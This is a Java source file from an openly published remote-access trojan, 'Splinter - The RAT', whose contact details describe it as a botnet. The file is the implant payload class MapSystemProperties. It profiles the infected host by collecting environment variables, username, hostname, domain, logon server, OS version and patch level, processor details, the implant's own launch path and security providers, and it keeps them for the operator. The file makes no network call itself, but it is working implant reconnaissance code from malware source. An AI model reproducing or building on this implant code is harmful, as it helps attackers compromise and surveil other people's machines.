/**

	Copyright:
	==========
	
	Splinter - The RAT (Remote Administrator Tool)
	Developed By Solomon Sonya, Nick Kulesza, and Dan Gunter
	Copyright 2013 Solomon Sonya
	
	This copyright applies to the entire Splinter Project and all relating source code

	This program is free software: you are free to  redistribute 
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.       

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
	
	By executing this program, you assume full responsibility 
	and will hold zero responsibility, liability, damages, etc to the
	development team over this program or any variations of this program.
	This program is not meant to be harmful or used in a malicious manner.
	
	Notes:
	===========
	This program is 100% open source and still a very BETA version. 
	I don't know of any significant bugs.... but I'm sure they may exist ;-)
	If you find one, congratulations, please forward the data back to us 
	and we'll do our best to put a fix/workaround if applicable (and time permitting...)
	Finally, feature imprevements/updates, etc, please let us know what you would
	like to see, and we'll do my best to have it incorporated into the newer 
	versions of Splinter or new projects to come.  We're here to help.
	
	Thanks again, 
	
	Solomon
	
	Contact: 
	========
	Twitter	--> @splinter_therat, @carpenter1010
	Email	--> splinterbotnet@gmail.com
	GitHub	--> https://github.com/splinterbotnet
**/



package Implant.Payloads;

import Implant.Driver;
import java.io.PrintStream;
import java.net.URL;
import java.security.CodeSource;
import java.security.ProtectionDomain;
import java.security.Provider;
import java.security.Security;
import java.util.Iterator;
import java.util.Map;
import java.util.Set;

public class MapSystemProperties
{
  static Map systemMap = null;
  static Set systemKeys = null;
  static Iterator systemIterator = null;

  static String OS = "UNKNOWN";
  static String CurrentWorkingDirectory = "UNKNOWN";
  static String UserHomeDirectory = "UNKNOWN";
  static String JavaVersionNumber = "UNKNOWN";
  static String OSArcitecture = "UNKNOWN";
  static String UserDesktop = "UNKNOWN";

  static Provider[] providers = null;

  static boolean thisIsAWindowsSystem = true;
  static boolean thisIsUNIXSystem = false;

  static boolean printToStdOut = false;

  static String map_USERPROFILE = "USERPROFILE";
  static String map_ProgramData = "ProgramData";
  static String map_PATHEXT = "PATHEXT";
  static String map_JAVA_HOME = "JAVA_HOME";
  static String map_TEMP = "TEMP";
  static String map_SystemDrive = "SystemDrive";
  static String map_ProgramFiles = "ProgramFiles";
  static String map_HOMEDRIVE = "HOMEDRIVE";
  static String map_USERDOMAIN = "USERDOMAIN";
  static String map_ALLUSERSPROFILE = "ALLUSERSPROFILE";
  static String map_PROCESSOR_IDENTIFIER = "PROCESSOR_IDENTIFIER";
  static String map_TMP = "TMP";
  static String map_LOGONSERVER = "LOGONSERVER";
  static String map_PROCESSOR_ARCHITECTURE = "PROCESSOR_ARCHITECTURE";
  static String map_OS_Type = "OS";
  static String map_PROCESSOR_ARCHITEW6432 = "PROCESSOR_ARCHITEW6432";
  static String map_HOMEPATH = "HOMEPATH";
  static String map_PROCESSOR_LEVEL = "PROCESSOR_LEVEL";
  static String map_LOCALAPPDATA = "LOCALAPPDATA";
  static String map_HOSTNAME = "COMPUTERNAME";
  static String map_windir = "windir";
  static String map_SystemRoot = "SystemRoot";
  static String map_NUMBER_OF_PROCESSORS = "NUMBER_OF_PROCESSORS";
  static String map_USERNAME = "USERNAME";
  static String map_PUBLIC = "PUBLIC";
  static String map_PathToCMD = "ComSpec";
  static String map_APPDATA = "APPDATA";
  static String map_LaunchPath = "=C:";
  static String map_UserDir = "user.dir";
  static String map_UserName = "user.name";
  static String map_OS_Name = "os.name";
  static String map_OsVersion = "os.version";
  static String map_ServicePack = "sun.os.patch.level";
  static String map_OS_Arch = "os.arch";

  public static String strUSERPROFILE = "";
  public static String strProgramData = "";
  public static String strPATHEXT = "";
  public static String strJAVA_HOME = "";
  public static String strTEMP = "";
  public static String strSystemDrive = "";
  public static String strProgramFiles = "";
  public static String strHOMEDRIVE = "";
  public static String strUSERDOMAIN = "";
  public static String strALLUSERSPROFILE = "";
  public static String strPROCESSOR_IDENTIFIER = "";
  public static String strTMP = "";
  public static String strLOGONSERVER = "";
  public static String strPROCESSOR_ARCHITECTURE = "";
  public static String strOS_Type = "";
  public static String strPROCESSOR_ARCHITEW6432 = "";
  public static String strHOMEPATH = "";
  public static String strPROCESSOR_LEVEL = "";
  public static String strLOCALAPPDATA = "";
  public static String strHOSTNAME = "";
  public static String strwindir = "";
  public static String strSystemRoot = "";
  public static String strNUMBER_OF_PROCESSORS = "";
  public static String strUSERNAME = "";
  public static String strPUBLIC = "";
  public static String strPathToCMD = "";
  public static String strAPPDATA = "";
  public static String strLaunchPath = "";
  public static String strLaunchDirectory = "";
  public static String strLaunchBinary = "";
  public static String strUserDir = "";
  public static String strUserName = "";
  public static String strOsVersion = "";
  public static String strOS_Arch = "";
  public static String strServicePack = "";
  public static String strOS_Name = "";
  public static String strSerialNumber = "-";
  public static String strCountryCode = "-";
  public static String strNumUsers = " - ";

  public MapSystemProperties(boolean outputToStdOut)
  {
    printToStdOut = outputToStdOut;

    if (printToStdOut)
    {
      System.out.println("Displaying mapped System Environment...\n");
    }

    mapSystemVariables();

    thisIsAWindowsSystem = determineIfThisIsWindows();

    mapOperatingSystem(thisIsAWindowsSystem);
    mapProcessorArchitecture(thisIsAWindowsSystem);
    mapJavaVersionNumber(thisIsAWindowsSystem);
    mapCurrentWorkingDirectory(thisIsAWindowsSystem);
    mapUserDesktop(thisIsAWindowsSystem);
    mapUserHomeDirectory(thisIsAWindowsSystem);
    mapSecurityProviders(thisIsAWindowsSystem);

    if (printToStdOut)
    {
      System.out.println("\n\nRequired Summary: ");
      System.out.println("This is Windows OS: " + systemIsWindows());
      System.out.println("OS: " + getOperatingSystem());
      System.out.println("Current Working Directory: " + getCurrentWorkingDirectory());
    }

    if ((thisIsAWindowsSystem) && (printToStdOut)) {
      System.out.println("Path to Desktop: " + getUserDesktop());
    }

    if (printToStdOut)
      System.out.println("\n...Map Complete.\n\n");
  }

  public boolean determineIfThisIsWindows()
  {
    try
    {
      boolean thisIsWin = System.getProperty("os.name").startsWith("Windows");

      if (thisIsWin) {
        thisIsUNIXSystem = false;
      }
      else {
        thisIsUNIXSystem = true;
      }
      return thisIsWin;
    }
    catch (Exception e)
    {
      System.out.println("Exception caught in determineIfThisIsWindows mtd.  \nCannot determine if this is Windows or UNIX OS");

      thisIsAWindowsSystem = false;
      thisIsUNIXSystem = false;
    }
    return false;
  }

  public void mapSystemVariables()
  {
    try
    {
      systemMap = System.getenv();
      systemKeys = systemMap.keySet();
      systemIterator = systemKeys.iterator();

      if (printToStdOut)
      {
        System.out.println("Variable Name \t\t Variabe Values");
      }

      String strKey = "";
      String strVal = "";

      while (systemIterator.hasNext())
      {
        strKey = (String)systemIterator.next();
        strVal = (String)systemMap.get(strKey);

        if (printToStdOut)
        {
          System.out.println(strKey + "\t\t" + strVal);
        }

      }

      strUSERPROFILE = (String)systemMap.get(map_USERPROFILE);

      strProgramData = (String)systemMap.get(map_ProgramData);
      strPATHEXT = (String)systemMap.get(map_PATHEXT);
      strJAVA_HOME = (String)systemMap.get(map_JAVA_HOME);
      strTEMP = (String)systemMap.get(map_TEMP);
      strSystemDrive = (String)systemMap.get(map_SystemDrive);
      strProgramFiles = (String)systemMap.get(map_ProgramFiles);
      strHOMEDRIVE = (String)systemMap.get(map_HOMEDRIVE);
      strUSERDOMAIN = (String)systemMap.get(map_USERDOMAIN);
      strALLUSERSPROFILE = (String)systemMap.get(map_ALLUSERSPROFILE);
      strPROCESSOR_IDENTIFIER = (String)systemMap.get(map_PROCESSOR_IDENTIFIER);
      strTMP = (String)systemMap.get(map_TMP);
      strLOGONSERVER = (String)systemMap.get(map_LOGONSERVER);
      strPROCESSOR_ARCHITECTURE = (String)systemMap.get(map_PROCESSOR_ARCHITECTURE);
      strOS_Type = (String)systemMap.get(map_OS_Type);
      strPROCESSOR_ARCHITEW6432 = (String)systemMap.get(map_PROCESSOR_ARCHITEW6432);
      strHOMEPATH = (String)systemMap.get(map_HOMEPATH);
      strPROCESSOR_LEVEL = (String)systemMap.get(map_PROCESSOR_LEVEL);
      strLOCALAPPDATA = (String)systemMap.get(map_LOCALAPPDATA);
      strHOSTNAME = (String)systemMap.get(map_HOSTNAME);
      strwindir = (String)systemMap.get(map_windir);
      strSystemRoot = (String)systemMap.get(map_SystemRoot);
      strNUMBER_OF_PROCESSORS = (String)systemMap.get(map_NUMBER_OF_PROCESSORS);
      strUSERNAME = (String)systemMap.get(map_USERNAME);
      strPUBLIC = (String)systemMap.get(map_PUBLIC);
      strPathToCMD = (String)systemMap.get(map_PathToCMD);
      strAPPDATA = (String)systemMap.get(map_APPDATA);
      try
      {
        strLaunchPath = getClass().getProtectionDomain().getCodeSource().getLocation().getPath();
        strLaunchPath = strLaunchPath.replace("%20", " ");
        strLaunchPath = strLaunchPath.replace("/", Driver.fileSeperator);

        if ((strLaunchPath != null) && (strLaunchPath.startsWith(Driver.fileSeperator)))
        {
          strLaunchPath = strLaunchPath.substring(1);
        }

        try
        {
          if (strLaunchPath.substring(strLaunchPath.length() - 5).contains("."))
          {
            strLaunchBinary = strLaunchPath.substring(strLaunchPath.lastIndexOf(Driver.fileSeperator) + 1);

            strLaunchDirectory = strLaunchPath.substring(0, strLaunchPath.lastIndexOf(Driver.fileSeperator));

            strLaunchDirectory += Driver.fileSeperator;
          }
          else
          {
            strLaunchDirectory = strLaunchPath;
          }
        }
        catch (Exception localException1)
        {
        }
      }
      catch (Exception e) {
        strLaunchPath = System.getProperty("user.dir");
      }
      strUserDir = System.getProperty(map_UserDir);
      strUserName = System.getProperty(map_UserName);
      strOsVersion = System.getProperty(map_OsVersion);
      strOS_Arch = System.getProperty(map_OS_Arch);
      strOS_Name = System.getProperty(map_OS_Name);
      strServicePack = System.getProperty(map_ServicePack);

      if (printToStdOut)
      {
        Driver.sop("\n\n\n");
        Driver.sop(" strProgramData: " + strProgramData);
        Driver.sop(" strPATHEXT: " + strPATHEXT);
        Driver.sop(" strJAVA_HOME: " + strJAVA_HOME);
        Driver.sop(" strTEMP: " + strTEMP);
        Driver.sop(" strSystemDrive: " + strSystemDrive);
        Driver.sop(" strProgramFiles: " + strProgramFiles);
        Driver.sop(" strHOMEDRIVE: " + strHOMEDRIVE);
        Driver.sop(" strUSERDOMAIN: " + strUSERDOMAIN);
        Driver.sop(" strALLUSERSPROFILE: " + strALLUSERSPROFILE);
        Driver.sop(" strPROCESSOR_IDENTIFIER: " + strPROCESSOR_IDENTIFIER);
        Driver.sop(" strTMP: " + strTMP);
        Driver.sop(" strLOGONSERVER: " + strLOGONSERVER);
        Driver.sop(" strPROCESSOR_ARCHITECTURE: " + strPROCESSOR_ARCHITECTURE);
        Driver.sop(" strOS_Type: " + strOS_Type);
        Driver.sop(" strPROCESSOR_ARCHITEW6432: " + strPROCESSOR_ARCHITEW6432);
        Driver.sop(" strHOMEPATH: " + strHOMEPATH);
        Driver.sop(" strPROCESSOR_LEVEL: " + strPROCESSOR_LEVEL);
        Driver.sop(" strLOCALAPPDATA: " + strLOCALAPPDATA);
        Driver.sop(" strHOSTNAME: " + strHOSTNAME);
        Driver.sop(" strwindir: " + strwindir);
        Driver.sop(" strSystemRoot: " + strSystemRoot);
        Driver.sop(" strNUMBER_OF_PROCESSORS: " + strNUMBER_OF_PROCESSORS);
        Driver.sop(" strUSERNAME: " + strUSERNAME);
        Driver.sop(" strPUBLIC: " + strPUBLIC);
        Driver.sop(" strPathToCMD: " + strPathToCMD);
        Driver.sop(" strAPPDATA: " + strAPPDATA);
        Driver.sop(" strLaunchPath: " + strLaunchPath);
        Driver.sop(" strUserDir: " + strUserDir);
        Driver.sop(" strUserName: " + strUserName);
        Driver.sop(" strOsVersion: " + strOsVersion);
        Driver.sop(" strOS_Arch: " + strOS_Arch);
        Driver.sop(" strOS_Name: " + strOS_Name);
      }

    }
    catch (Exception e)
    {
      System.out.println("Exception caught in mapSystemVariables in ReBACAR_Main");
    }
  }

  public boolean mapOperatingSystem(boolean thisIsWindows)
  {
    try
    {
      OS = System.getProperty("os.name");
      return true;
    }
    catch (Exception e) {
    }
    return false;
  }

  public boolean mapSecurityProviders(boolean thisIsWindows)
  {
    try
    {
      if (printToStdOut)
      {
        System.out.print("SECURITY PROVIDERS:");
      }

      providers = Security.getProviders();

      String key = ""; String val = "";

      for (int i = 0; i < providers.length; i++)
      {
        if (printToStdOut)
        {
          System.out.print("\t\t" + providers[i] + ": " + "\n\t\t");
        }

        for (Iterator itr = providers[i].keySet().iterator(); itr.hasNext(); )
        {
          key = (String)itr.next();

          val = (String)providers[i].get(key);

          if (printToStdOut)
          {
            System.out.print("Key: " + val + "\t");
          }
        }

      }

      if (printToStdOut)
      {
        System.out.println("\n");
      }

      return true;
    }
    catch (Exception localException)
    {
    }

    return false;
  }

  public boolean mapProcessorArchitecture(boolean thisIsWindows)
  {
    try
    {
      OSArcitecture = System.getProperty("os.arch");
      return true;
    }
    catch (Exception e) {
    }
    return false;
  }

  public boolean mapCurrentWorkingDirectory(boolean thisIsWindows)
  {
    try
    {
      if (thisIsWindows) {
        CurrentWorkingDirectory = System.getProperty("user.dir").replace("\\", "/");
      }
      else {
        CurrentWorkingDirectory = System.getProperty("user.dir");
      }
      return true;
    }
    catch (Exception e) {
    }
    return false;
  }

  public boolean mapUserHomeDirectory(boolean thisIsWindows)
  {
    try
    {
      if (thisIsWindows) {
        UserHomeDirectory = System.getProperty("user.home").replace("\\", "/");
      }
      else {
        UserHomeDirectory = System.getProperty("user.home");
      }
      return true;
    }
    catch (Exception e) {
    }
    return false;
  }

  public boolean mapUserDesktop(boolean thisIsWindows)
  {
    try
    {
      if (thisIsWindows)
      {
        UserDesktop = (System.getProperty("user.home") + "/Desktop").replace("\\", "/");
      }

      return true;
    }
    catch (Exception e) {
    }
    return false;
  }

  public boolean mapJavaVersionNumber(boolean thisIsWindows)
  {
    try
    {
      JavaVersionNumber = System.getProperty("java.version");
      return true;
    }
    catch (Exception e) {
    }
    return false;
  }

  public boolean systemIsWindows()
  {
    return thisIsAWindowsSystem;
  }

  public boolean systemIsUNIX()
  {
    return thisIsUNIXSystem;
  }

  public String getOperatingSystem()
  {
    return OS;
  }

  public String getProcessorArchitecture()
  {
    return OSArcitecture;
  }

  public String getCurrentWorkingDirectory()
  {
    return CurrentWorkingDirectory;
  }

  public String getUserHomeDirectory()
  {
    return UserHomeDirectory;
  }

  public String getUserDesktop()
  {
    return UserDesktop;
  }

  public String getJavaVersionNumber()
  {
    return JavaVersionNumber;
  }
}